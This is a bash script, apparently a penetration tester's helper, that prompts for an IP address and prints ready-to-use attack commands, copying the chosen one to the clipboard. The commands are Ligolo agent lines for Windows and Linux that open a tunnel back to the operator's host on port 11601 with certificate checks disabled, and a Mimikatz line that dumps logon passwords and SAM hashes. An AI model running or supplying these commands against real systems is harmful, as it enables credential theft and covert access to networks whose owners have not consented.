#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Get current $IP from environment
CURRENT_IP="${IP}"

echo -e "${BLUE}=== Tools Script - IP Management ===${NC}"
echo ""

# Check if $IP is set
if [ -z "$CURRENT_IP" ]; then
    echo -e "${YELLOW}No IP currently set in \$IP variable${NC}"
    echo -n "Enter target IP: "
    read TARGET_IP
else
    echo -e "${GREEN}Current target's \$IP: ${CURRENT_IP}${NC}"
    echo -n "Use this IP? (y/n) [default: y]: "
    read USE_CURRENT
    
    # Treat empty input as 'y'
    if [[ -z "$USE_CURRENT" ]] || [[ "$USE_CURRENT" =~ ^[Yy]$ ]]; then
        TARGET_IP="$CURRENT_IP"
    else
        echo -n "Enter new IP: "
        read TARGET_IP
    fi
fi

# Validate IP format (basic check)
if [[ ! "$TARGET_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}Invalid IP format!${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}Using IP: ${TARGET_IP}${NC}"
echo ""

# Windows Commands Section
echo -e "${BLUE}=== Windows Commands ===${NC}"
echo ""
echo -e "${YELLOW}[1] Ligolo Agent (Windows)${NC}"
echo -e "    .\\ligolo_agent.exe -connect ${TARGET_IP}:11601 -ignore-cert"
echo ""
echo -e "${YELLOW}[2] Mimikatz (Full Dump)${NC}"
echo -e "    .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\""
echo ""

# Linux Commands Section
echo ""
echo -e "${BLUE}=== Linux Commands ===${NC}"
echo ""
echo -e "${YELLOW}[3] Ligolo Agent (Linux)${NC}"
echo -e "    ./ligolo_agent -connect ${TARGET_IP}:11601 -ignore-cert"
echo ""

# Option to copy commands
echo ""
echo -n "Select command to copy (1-3) or press Enter to exit: "
read CHOICE

case $CHOICE in
    1)
        CMD=".\\ligolo_agent.exe -connect ${TARGET_IP}:11601 -ignore-cert"
        echo "$CMD" | xclip -selection clipboard 2>/dev/null || echo "$CMD" | pbcopy 2>/dev/null || echo -e "${YELLOW}Clipboard not available. Command:${NC}\n$CMD"
        echo -e "${GREEN}Command copied to clipboard!${NC}"
        ;;
    2)
        CMD=".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\""
        echo "$CMD" | xclip -selection clipboard 2>/dev/null || echo "$CMD" | pbcopy 2>/dev/null || echo -e "${YELLOW}Clipboard not available. Command:${NC}\n$CMD"
        echo -e "${GREEN}Command copied to clipboard!${NC}"
        ;;
    3)
        CMD="./ligolo_agent -connect ${TARGET_IP}:11601 -ignore-cert"
        echo "$CMD" | xclip -selection clipboard 2>/dev/null || echo "$CMD" | pbcopy 2>/dev/null || echo -e "${YELLOW}Clipboard not available. Command:${NC}\n$CMD"
        echo -e "${GREEN}Command copied to clipboard!${NC}"
        ;;
    "")
        echo "Exiting..."
        ;;
    *)
        echo -e "${RED}Invalid choice${NC}"
        ;;
esac
